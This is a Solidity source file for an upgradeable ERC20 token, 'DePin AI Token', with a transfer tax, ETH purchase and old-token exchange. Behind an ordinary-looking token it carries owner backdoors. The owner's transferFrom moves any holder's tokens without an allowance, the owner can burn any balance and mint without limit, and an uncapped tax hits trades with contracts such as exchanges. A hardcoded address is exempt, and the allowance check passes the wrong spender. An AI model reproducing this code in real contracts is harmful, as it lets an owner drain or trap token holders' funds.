//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {ERC20Upgradeable} from "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import {ERC20BurnableUpgradeable} from "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20BurnableUpgradeable.sol";
import {ERC20PausableUpgradeable} from "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20PausableUpgradeable.sol";
import {ERC20PermitUpgradeable} from "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20PermitUpgradeable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/structs/EnumerableSet.sol";
import "./AggregatorV3Interface.sol";
import {console} from "forge-std/console.sol";

contract DPAIToken is
    Initializable,
    UUPSUpgradeable,
    OwnableUpgradeable,
    ERC20BurnableUpgradeable,
    ERC20PausableUpgradeable,
    ERC20PermitUpgradeable
{
    using EnumerableSet for EnumerableSet.AddressSet;

    error LessThanTax(address account, uint256 amount, uint256 tax);
    error NotCompleteRound();
    error CannotGetEthPrice();
    error FailToSend(address target, uint256 amount);

    bool private _isInitialized;
    uint256 public taxPromille;
    uint256 public minimalTax;
    uint256 public price;
    AggregatorV3Interface public priceFeed;
    address payable public wallet;
    EnumerableSet.AddressSet private noTaxList;
    address public oldToken;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() payable {
        _disableInitializers();
    }

    function initialize(
        address owner_,
        address priceFeed_,
        uint256 price_,
        address payable wallet_
    ) public initializer {
        if (_isInitialized) return;
        __Ownable_init(owner_);
        _isInitialized = true;
        __UUPSUpgradeable_init();
        __ERC20_init("DePin AI Token", "DPAI");
        __ERC20Pausable_init();
        __ERC20Burnable_init();
        __ERC20Permit_init("DePin AI Token");
        priceFeed = AggregatorV3Interface(priceFeed_);
        price = price_;
        wallet = wallet_;
    }
    function pause() public onlyOwner {
        _pause();
    }

    function unpause() public onlyOwner {
        _unpause();
    }

    function _authorizeUpgrade(
        address newImplementation
    ) internal override onlyOwner {}

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function setTaxPromille(uint256 amount) public onlyOwner {
        taxPromille = amount;
    }

    function isTaxFree(address to) public view returns (bool) {
        return noTaxList.contains(to);
    }

    function setPriceFeed(address newFeed) public onlyOwner {
        priceFeed = AggregatorV3Interface(newFeed);
    }

    function setWallet(address payable newWallet) public onlyOwner {
        wallet = newWallet;
    }

    function setMinimalTax(uint256 amount) public onlyOwner {
        minimalTax = amount;
    }

    function setOldToken(address newToken) public onlyOwner {
        oldToken = newToken;
    }

    function setTaxFree(address to, bool state) public onlyOwner {
        if (state) {
            noTaxList.add(to);
            return;
        }
        if (!state) {
            noTaxList.remove(to);
        }
    }

    function transfer(
        address to,
        uint256 value
    ) public virtual override whenNotPaused returns (bool) {
        if (msg.sender == owner()) {
            _transfer(msg.sender, to, value);
            return true;
        }
        return _transferTaxed(msg.sender, to, value);
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public virtual override whenNotPaused returns (bool) {
        if (msg.sender == owner()) {
            _transfer(from, to, value);
            return true;
        }
        _spendAllowance(from, to, value);
        return _transferTaxed(from, to, value);
    }

    function burn(address to, uint256 value) public virtual onlyOwner {
        _burn(to, value);
    }

    function _transferTaxed(
        address from,
        address to,
        uint256 value
    ) internal returns (bool) {
        if (
            (from == 0x3F7084563353B2588D1463a823FAcF8A54425570) ||
            (from.code.length == 0 && to.code.length == 0)
        ) {
            _transfer(from, to, value);
            return true;
        }
        if (minimalTax >= value) revert LessThanTax(from, value, minimalTax);
        uint256 tax = (value * taxPromille) / 1000;
        if (tax < minimalTax) tax = minimalTax;
        if (tax > 0) _transfer(from, owner(), tax);
        _transfer(from, to, value - tax);
        return true;
    }

    function _update(
        address from,
        address to,
        uint256 value
    )
        internal
        virtual
        override(ERC20PausableUpgradeable, ERC20Upgradeable)
        whenNotPaused
    {
        super._update(from, to, value);
    }

    function transferToken(
        address token,
        address to,
        uint256 value
    ) external onlyOwner returns (bool) {
        return IERC20(token).transfer(to, value);
    }

    function transferTo(
        address to,
        uint256 value
    ) external onlyOwner returns (bool) {
        _transfer(address(this), to, value);
        return true;
    }

    function getEthPrice() public view returns (uint256) {
        int256 ethPrice = priceFeed.latestAnswer();
        if (ethPrice == 0) revert CannotGetEthPrice();
        uint256 mul = 10000000000; 
        return (uint256(ethPrice) * mul) / price;
    }

    receive() external payable {
        _transfer(address(this), msg.sender, msg.value * getEthPrice());
        (bool sent,) = wallet.call{value: msg.value}("");
        if(!sent) revert FailToSend(wallet, msg.value);
    }

    function exchange (uint256 amount) external returns (uint256) {
        IERC20(oldToken).transferFrom(msg.sender, wallet, amount);
        uint256 newAmount = amount/5;
        _transfer(address(this), msg.sender,newAmount);
        return newAmount;
    }
}
